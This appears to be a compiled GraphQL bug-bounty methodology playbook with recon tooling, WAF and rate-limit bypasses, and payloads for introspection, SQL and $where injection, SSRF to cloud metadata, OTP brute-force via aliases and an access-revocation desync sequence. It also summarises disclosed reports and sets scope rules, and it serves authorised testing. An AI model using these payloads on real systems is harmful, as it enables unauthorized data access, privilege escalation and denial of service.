inql -t https://target/graphql --generate-queries

# Clairvoyance — brute-force field names when introspection is disabled
python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json

# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)
graphql-cop -t https://target/graphql
```

---

### Bypass Techniques

**Defense: Introspection disabled**
- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses
- Use `clairvoyance` to brute-force field names against a wordlist
- Check JS bundles for hardcoded query strings that reveal the schema

**Defense: Depth limiting**
- Fragment spread to increase effective depth without hitting the limiter:
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```

**Defense: Rate limiting per IP**
- Use batch operations (array of queries in one POST)
- Distribute across authenticated sessions

**Defense: Auth checks on mutations**
- Test with tokens at different privilege tiers (viewer, member, admin)
- Test unauthenticated — some mutations don't check session at all
- Test with tokens from *different organizations* — multi-tenant IDOR

**Defense: WAF blocking `__schema`**
- Alias the introspection field:
```graphql
{ s: __schema { t: types { n: name } } }
```
- Use HTTP parameter pollution or alternate content-type headers

**Defense: Operation whitelisting (persisted queries)**
- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
- Look for a non-whitelisted endpoint (dev, staging, internal proxy)

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

1. **What can the attacker DO right now?**
   Must be a concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources. "The schema is visible" alone is not enough — what does the schema unlock?

2. **What does the victim LOSE?**
   Must be a real asset: data confidentiality, access control integrity, org security guarantees. For the RC pattern: an org admin loses the guarantee that removing a team revokes all access. That's a security contract violation.

3. **Can it be reproduced in 10 minutes from scratch?**
   For RC/desync bugs: write the exact curl sequence. Run it twice. If the privilege persists deterministically (not timing-dependent flakiness), it's reportable. If it requires millisecond timing luck, document the window and test on low-load times.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Introspection enabled, GraphiQL exposed, and suggestions enabled are **informational** on their own unless the schema contains data the program considers sensitive (private fields, internal mutations) — and even then, prefer a concrete read/mutation PoC. Many programs explicitly exclude "introspection enabled."
- For IDOR: prove the returned object belongs to a **different user/tenant** and contains non-public data. IDs 1/2/4 with a gap 3 returning a delisted product is a valid demo; a delisted-but-public product may just be intended behavior — check the business context.
- For alias/batch bypass: show the *before* state (per-request limiter triggers at N requests) and the *after* state (N×k operations accepted in one request) with a meaningful outcome (successful login, OTP verified, coupon granted). A response containing all attempts but all failing is not a rate-limit bypass.
- For DoS findings, stay within authorization: use short, bounded bursts, document request counts and timings, and stop at the first clear resource-exhaustion signal. Many programs reject purely theoretical "no depth limit" reports — show a concrete latency/thread exhaustion effect or a vendor-advisory/CVE match (e.g., CVE-2024-50311).
- For CSRF, you must demonstrate a real cross-site state change with the victim's session — not merely that GET is accepted. Confirm SameSite and content-type enforcement; a JSON-POST-only endpoint with correct preflight rejection is not vulnerable.
- Mutation authz: use two accounts (attacker A, victim B) and show A's token executing a mutation on B's object. A mutation that only returns an error message difference is an enumeration clue, not a finding (unless sensitive PII is exposed).
- Do not report a "hidden field" discovered only via introspection if the resolver rejects unauthorized access — resolver-level authorization is what matters; schema visibility is not an authorization boundary.
- Record exact query text, variables, endpoint path, and method in the report — GraphQL requests are not self-describing in a screenshot, and triagers must be able to replay the alias/batch exactly.

### Escalation and related chains

### Escalation chains

- GraphQL IDOR -> PII.
- GraphQL injection -> RCE.
- Mutation mass assignment -> admin.

### Related Skills & Chains

- **`idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`logic-and-design`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.

### Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.

### Tools and wordlists

### Tools

`graphql-voyager` · `InQL` · `GraphQLmap` · `clairvoyance`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_graphql.txt` | 64 |
| `~/.local/share/hackerone-reports/wordlists/params_graphql.txt` | 14 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_graphql.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_graphql.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Run introspection and authz tests by hand; templates mostly fingerprint servers and known CVEs.

```sh
nuclei -u https://target -tags graphql \
       -severity low,medium,high,critical -rl 40 -o nuclei_graphql.txt
nuclei -u https://target -t ~/nuclei-templates/http/technologies/graphql \
       -rl 40 -o nuclei_graphql_graphql.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
       -rl 40 -o nuclei_graphql_other.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Real-world examples

### Real Impact Examples

**Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
An attacker who legitimately had admin access to a repository via team membership gets removed by the org admin through the REST API. The attacker, before removal completes, calls the `updateTeamsRepository` GraphQL mutation to re-associate their team with admin permissions. The REST removal and GraphQL re-grant create a desync where the UI shows the team as removed, but the GraphQL state preserves admin-level access. The attacker retains covert write access to the repository indefinitely — pushing code, reading secrets in CI/CD — without appearing in the team's member list. This persists through org audits.

**Scenario B — Covert Access via Repo Transfer Race (GitHub-pattern)**
An attacker with admin access initiates a repository transfer to another organization via the REST API. During or after the transfer, they invoke `updateTeamsRepository` on the now-transferred repo's ID. Because the GraphQL mutation doesn't validate current org ownership state consistently with the REST transfer event, the original attacker's team retains admin access on a repo now owned by a different organization. The receiving org has no visibility into this team association. The attacker can exfiltrate intellectual property from an org they have no legitimate relationship with.

**Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.

---

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class graphql --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class graphql
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class graphql
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class graphql --min-bounty 1000
```

### Related

- `hackerone-idor` (450 reports)
- `hackerone-authz-bypass` (1,386 reports)
- `hackerone-sqli` (331 reports)

### Related

- `idor` (450 reports)
- `authz-bypass` (1,386 reports)
- `sqli` (331 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/graphql
2. https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass
3. https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
4. https://www.graphql.org/learn/security/
5. https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/99-GraphQL/
6. https://afine.com/graphql-security-from-a-pentesters-perspective
7. https://www.yeswehack.com/learn-bug-bounty/hacking-graphql-endpoints
8. https://github.com/PortSwigger/inql

### Additional notes

### Parameters observed

`operation` · `ssl` · `type` · `embedded_submission_form_uuid` · `variables` · `document_type` · `name` · `sentry_key` · `access_level` · `core_hacker_username` · `core_team_handle` · `query` · `sort` · `page`

### Confidential data of users and limited metadata of programs and reports accessible via GraphQL

`#489146` · HackerOne · $0 · critical · 2019-02-03 · ▲1033
> Summary: The GraphQL endpoint doesn't have access controls implemented properly. Description: Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook user id, account recovery phone number verified at, totp enabled, etc. These are just some examples of fields which are getting leaked directly from GraphQL.

### Email address of any user can be queried on Report Invitation GraphQL type when username is known

`#792927` · HackerOne · $0 · high · 2020-02-20 · ▲671
> Summary: Email id of all hackerone users disclosure Description: There is an flaw , with that i can get all hackerone users email id Steps To Reproduce 1. Invoke the below graphql call POST /graphql HTTP/1.1 you will get below response 2. to reproduce from your account, create one test program, and create one report for that program, get that report id gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace…

### IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query

`#2122671` · HackerOne · $0 · high · 2023-08-29 · ▲395
> Summary: Hey team, While editing our Licenses and certifications if we change the ID number we can delete other users Licenses and certifications . it simply can be done by editing the ID number in our graphql query. If change the ID from 1 to X possible range then we can delete all the Licenses and certifications present between these. Steps To Reproduce 1. Log in to your own account in two browsers A and B with User A and User B 2.

### Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)

`#3782701` · Mozilla · $12,000 · critical · 2026-08-05 · ▲361
> The public GraphQL endpoint at /graphql allows an unauthenticated caller to execute arbitrary JavaScript inside the web-server's Node.js process. The query argument filter is a free-form JSON object that the server passes directly into the sift library. The version in use (sift 17.1.3) compiles a $where string into a function using new Function and executes it.

### Private list members disclosure via GraphQL

`#885539` · X / xAI · $0 · low · 2020-08-04 · ▲346
> Summary: Due to improper queries of GraphQL, the attacker can steal members of the private list. Description: Twitter implements a unique GraphQL endpoint, which can use only the queries that Twitter specified. However, there is a flaw in the backend (https://api.████████.com/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers). This vulnerability requires snowflake brute-force, but it's not impossible.

### Disclosed Report Citations (Backfill +9 — 2019-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 3 internal references. Each is a distinct GraphQL subclass with a working PoC documented in the cited writeup.

4. **HackerOne — Confidential user-data exposure via GraphQL `User` type** ([H1 #489146](https://hackerone.com/reports/489146))
    - Subclass: broken field-level authorization (PII exposure)
    - Payload: direct `user(id:...)` query returning `email`, `backup_codes_hash`, `facebook_user_id`, `account_recovery_phone_number_verified_at`, `totp_enabled`
    - Root cause: backend migration introduced a GraphQL `User` type with no field-level authz; any authenticated user could enumerate PII of all users
    - Year: 2019 — **$20,000**, 1,028 upvotes

5. **HackerOne — `DestroyLlmConversation` mutation IDOR (Copilot pre-release)** ([H1 #2218334](https://hackerone.com/reports/2218334))
    - Subclass: mutation IDOR on AI/LLM feature
    - Payload: `mutation { destroyLlmConversation(input:{id:"<victim_conv_id>"}) { … } }`
    - Root cause: new LLM-conversation mutation shipped without authorization decorator; any user could destroy any conversation
    - Year: 2023 — caught pre-launch, no bounty (202 upvotes)

6. **Shopify — `BillingDocumentDownload` cross-tenant IDOR** ([H1 #2207248](https://hackerone.com/reports/2207248))
    - Subclass: IDOR on relay GID across tenants
    - Payload: `query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }`
    - Root cause: `BillingInvoice` resolver authorized the requester's shop but did not verify the invoice belonged to that shop
    - Year: 2024 — **$5,000**, 175 upvotes

7. **Shopify — Rate-limit bypass via negative cost** ([H1 #481518](https://hackerone.com/reports/481518))
    - Subclass: query-cost-calc abuse (sibling pattern to alias batching)
    - Payload: `query { products(first:-100) { … } }` — negative `first` produced a negative query-cost contribution, refilling the leaky-bucket each call
    - Root cause: query-cost calculator did not floor at zero; negative values subtracted from the consumed budget
    - Year: 2019 — **$1,000**

8. **Stripe — Cross-tenant IDOR via `UpdateAtlasApplicationPerson`** ([H1 #1066203](https://hackerone.com/reports/1066203))
    - Subclass: cross-tenant IDOR on mutation
    - Payload: `mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", …}) }` — adding/modifying a co-founder on another merchant's Stripe Atlas application
    - Root cause: mutation scoped only to "is admin of some merchant," not "is admin of the merchant owning this person"
    - Year: 2020 — bounty undisclosed (resolved)

9. **EXNESS — SSRF in GraphQL `allTicks` query** ([H1 #1864188](https://hackerone.com/reports/1864188))
    - Subclass: SSRF via GraphQL argument
    - Payload: `query { allTicks(source:"http://169.254.169.254/latest/meta-data/") { … } }` — `source` arg fed into a server-side HTTP client
    - Root cause: GraphQL field accepted a URL arg and dereferenced it without scheme/host allowlist
    - Year: 2023 — **$3,000**, 249 upvotes

10. **EXNESS — GraphQL attribute-batching DoS** ([H1 #2293642](https://hackerone.com/reports/2293642))
    - Subclass: DoS via batching / deep-attribute amplification on unauth endpoint
    - Payload: single HTTP request containing N batched operations, each requesting deeply nested attribute trees, sustained until origin OOM
    - Root cause: no query-depth, query-complexity, or batch-size limits on unauthenticated `/graphql`
    - Year: 2024 — bounty undisclosed (resolved)

11. **GitLab — Malicious-runner attach via `runnerUpdate` (CVE-2023-2478)** ([Advisory](https://about.gitlab.com/releases/2023/05/05/critical-security-release-gitlab-15-11-2-released/))
    - Subclass: auth bypass on mutation / project-scope missing
    - Payload: `mutation { runnerUpdate(input:{id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"]}) }`
    - Root cause: `runnerUpdate` did not check that the caller had Maintainer on the target project — any user could bind their malicious runner and intercept CI jobs (build secrets, code execution)
    - Year: 2023 — Critical, CVSS 9.6 (H1 bounty undisclosed; GitLab Critical-tier typically $20k–$35k)

12. **AS Watson — Auth bypass via unrestricted `createAdminUser` mutation** ([HackerOne blog](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass))
    - Subclass: sensitive mutation reachable without authentication (introspection-aided discovery)
    - Payload: `mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"…"}) { token } }` invoked unauthenticated after schema enumeration via introspection
    - Root cause: schema lacked per-field authorization directives; `createAdminUser` exposed to public role
    - Year: 2023 — "Best Bug" prize at HackerOne Ambassador World Cup

---

### Alias batching: when it wins races vs when it doesn't

A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:

| Resolver type | Behavior on aliased mutations | Alias batching wins races? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |
| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |
| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |

**Verification example (single-threaded Flask + SQLite resolver):**
- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.
- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).

**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Graphql — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Introspection -> `{__schema{types{name fields{name}}}}`

- Alias abuse -> `{a:login(u:"a") b:login(u:"b")}`

- Mass assignment -> `mutation{updateUser(role:"admin"){id}}`

- Injection -> `filter: "{\"$where\":\"...\"}"`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 7× | `$where` |

| 2× | `\\| Decoded` |

| 2× | `{F_number_file}` |

| 2× | `curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>` |

| 1× | `sift(filter)` |

| 1× | `In CSP mode, sift does not support strings in "$where" condition` |

| 1× | `new Function("obj", "return " + myString)` |

| 1× | `next()` |

| 1× | `curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \ / --data-raw '{"query":"{me{_id username}}"}' \\| jq` |

| 1× | `(empty) \\| HTTP 500 /` |

| 1× | `edges { cursor node { id } }` |

| 1× | `source: "doc[\"_seq_no\"].value` |

| 1× | `sort_query: '[{"id":"asc"}]` |

| 1× | `doc[\"_seq_no\"].value` |

| 1× | `doc['<field>'].value` |

| 1× | `curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |

| 1× | `curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |

| 1× | `{"data":{"team":{"_id":"██████████","report_sources":[]}}}` |

| 1× | `{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` |

| 1× | `{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` |



## Parameters observed



`operation` · `ssl` · `type` · `embedded_submission_form_uuid` · `variables` · `document_type` · `name` · `sentry_key` · `access_level` · `core_hacker_username` · `core_team_handle` · `query` · `sort` · `page`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_graphql.txt` | 64 |

| `~/.local/share/hackerone-reports/wordlists/params_graphql.txt` | 14 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_graphql.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_graphql.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Run introspection and authz tests by hand; templates mostly fingerprint servers and known CVEs.



```sh

nuclei -u https://target -tags graphql \

       -severity low,medium,high,critical -rl 40 -o nuclei_graphql.txt

nuclei -u https://target -t ~/nuclei-templates/http/technologies/graphql \

       -rl 40 -o nuclei_graphql_graphql.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \

       -rl 40 -o nuclei_graphql_other.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Full Introspection Query:**

```graphql

{

  __schema {

    types {

      name

      fields {

        name

        type {

          name

          kind

        }

      }

    }

  }

}

```



**Minimal Introspection Probe (bypass attempt):**

```graphql

{ __typename }

```



**curl introspection test:**

```bash

curl -s -X POST https://target.com/graphql \

  -H "Content-Type: application/json" \

  -H "Authorization: Bearer YOUR_TOKEN" \

  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .

```



**Field suggestion probe (bypass blind introspection blocks):**

```graphql

{ unknownField }

```

If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.



**Batch query amplification:**

```json

[

  {"query": "{ user(id: 1) { email } }"},

  {"query": "{ user(id: 2) { email } }"},

  {"query": "{ user(id: 3) { email } }"}

]

```



**Subscription hijacking (cross-user channel access):**

```graphql

subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }

```

If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.



**Multi-code OTP/2FA brute-force via alias batching:**

```graphql

mutation { 

  v1: verifyOtp(code:"000001"){token} 

  v2: verifyOtp(code:"000002"){token}

  v3: verifyOtp(code:"000003"){token}

}

```

A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.



**RC desync test pattern (pseudo-sequence):**

```bash

# Step 1: Grant access via REST

curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \

  -H "Authorization: token ADMIN_TOKEN" \

  -d '{"permission":"admin"}'



# Step 2: Revoke via REST  

curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \

  -H "Authorization: token ADMIN_TOKEN"



# Step 3: Re-assert via GraphQL mutation

curl -X POST https://api.target.com/graphql \

  -H "Authorization: bearer ATTACKER_TOKEN" \

  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'



# Step 4: Verify persistent access

curl https://api.target.com/repos/ORG/REPO/teams \

  -H "Authorization: token ADMIN_TOKEN"

```



**Grep for GraphQL in JS bundles:**

```bash

grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js

grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js

```



**GraphQL introspection & audit tooling:**

```bash

# InQL (Burp extension) — visualize GraphQL schema and relationships

inql -t https://target/graphql --generate-queries



# Clairvoyance — brute-force field names when introspection is disabled

python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json



# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)

graphql-cop -t https://target/graphql

```



---

### Companion: hunting / references/techniques.md

# Graphql — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Run introspection; if disabled, use field suggestions and error messages.

- Test object-level authz on every query and mutation.

- Look for nested traversal and alias/batch abuse.

- Test mass assignment on mutations and hidden/admin fields.

- Check injection in arguments passed to resolvers.



## Bypass tricks



- Bypass depth/complexity limits with aliases or fragments.

- Use GET/query params when POST is blocked.

- Bypass authz with nested connections and node(id:) lookups.



## Deeper checklist



- Run introspection; if disabled, use field suggestions and error messages to recover the schema.

- Test object-level authorization on every query and mutation, not just the UI-used ones.

- Look for nested traversal and batch/alias abuse to bypass rate limits.

- Test mass assignment on mutations and hidden/admin fields.

- Check injection in arguments passed to resolvers (SQL/NoSQL, SSRF, template).

- Probe depth/complexity limits and query batching for DoS.

- Verify cross-tenant data access with two accounts.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Confidential data of users and limited metadata of programs and reports accessible via GraphQL** — `#489146` · HackerOne · $0 · ▲1033

  > The GraphQL endpoint doesn't have access controls implemented properly.

- **Email address of any user can be queried on Report Invitation GraphQL type when username is known** — `#792927` · HackerOne · $0 · ▲671

  > gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace that id with the "report id" in the above graphql query

- **Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)** — `#3782701` · Mozilla · $12,000 · ▲361

  > The anonymous role has the required scopes. On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks: `.

- **Private list members disclosure via GraphQL** — `#885539` · X / xAI · $0 · ▲346

  > Send requests to `https://api.█████████.com/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers?variables=%7B%22listId%22%3A%22[Valid Snowflake…

- **Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`** — `#1618347` · HackerOne · $25,000 · ▲295

  > `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){...

- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261

  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .

- **Github Apps can use Scoped-User-To-Server Tokens to Obtain Full Access to User's Projects in Project V2 GraphQL api** — `#1711938` · GitHub · $0 · ▲198

  > An incorrect authorization vulnerability was identified in GitHub Enterprise Server, allowing for escalation of privileges in GraphQL API requests from GitHub Apps.

- **IDOR on GraphQL queries BillingDocumentDownload and BillDetails** — `#2207248` · Shopify · $5,000 · ▲187

  > An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████:

- **DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** — `#3287208` · HackerOne · $0 · ▲185

  > Send the request to the GraphQL endpoint with valid or dummy `verification code` and `otp code` variables.

- **Disclosure of `payment_transactions` for programs via GraphQL query** — `#707433` · HackerOne · $0 · ▲178

  > {"query":"query Team mini profile($handle 0:String!,$size 1:ProfilePictureSizes!) {team(handle:$handle 0) {id,...F0}} fragment F0 on Team {id,name,about, profile picturePkPpF:profile picture(size:$size 1),offers swag,offers bounties,base bounty,payment…

- **Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql** — `#3694007` · HackerOne · $7,000 · ▲174

  > Decoded internal ` id` values: `404547633`, `408446504`, `416737094`, `417300042`, `417467303` — monotonically ascending, confirming JSON sort directives are parsed and applied by Elasticsearch.

- **SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter** — `#435066` · HackerOne · $0 · ▲174

  > The `embedded submission form uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection.

- **GraphQL AdminGenerateSessionPayload is leaked to staff with no permission** — `#898528` · Shopify · $0 · ▲173

  > This is a limited disclosure at the request of @hiffley.

- **Undocumented `fileCopy` GraphQL API** — `#981472` · Shopify · $2,000 · ▲157

  > the variables `absoluteKey` `key` and `path`values are the values of the file he uploaded in his store `storeB`

- **Team object in GraphQL disclosed private_comment** — `#978143` · HackerOne · $2,500 · ▲146

  > `{"data":{"node":{" id":"████████","pentester":null,"team":null,"key":"scope","private comment":"████","public comment":null,"rating":1,"recipient":null,"subject":null,"survey rating":{" id":"█████","team":null,"state":"completed","respondent":{"…

- **Bug in GraphQL and API integration leads to limited user address disclosure** — `#473742` · Starbucks · $0 · ▲144

  > The modified query resulted in a backend API request with undefined as a parameter.

- **Unauthorized user can obtain `report_sources` attribute through Team GraphQL object** — `#770209` · HackerOne · $2,500 · ▲142

  > `{"data":{"team":{" id":"█████████","report sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

- **Private program disclosure via `vpn_suspended` GraphQL query** — `#715192` · HackerOne · $2,500 · ▲138

  > If an external program (which also has private program) has enabled VPN , then value of vpn suspended become false, so with this information, an attacker can find external programs which have private program, because there is no VPN feature in sandbox mode…

- **GraphQL field on Team node can be used to determine if External Program runs invite-only program** — `#877642` · HackerOne · $2,500 · ▲107

  > + Condition 1 - When an external program doesn't have any policy defined, `policy markdown html` will be `null`.

- **Team object in GraphQL disclosed total number of whitelisted hackers** — `#342978` · HackerOne · $2,500 · ▲93

  > `{"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security",

- **IDOR - Leaking of team data (name, email, ID, member ID) via POST /api/v1/graphql  `FetchMemberships` operation** — `#2381816` · Tools for Humanity · $500 · ▲91

  > An authorization bypass issue was identified and subsequently remediated in the `FetchMemberships` GraphQL operation.

- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88

  > Mutations are `edit` or `create` queries used in Graphql.

- **Cross-Tenant IDOR ( graphql `AddRulesToPixelEvents` query ) allowing to add, update, and delete rules of any Pixel events on the platform** — `#984965` · TikTok · $0 · ▲84

  > Through a single request the advertiser can Add and/or Modify and/or Delete Pixel events.

- **Private information exposed through GraphQL filters** — `#645299` · HackerOne · $0 · ▲81

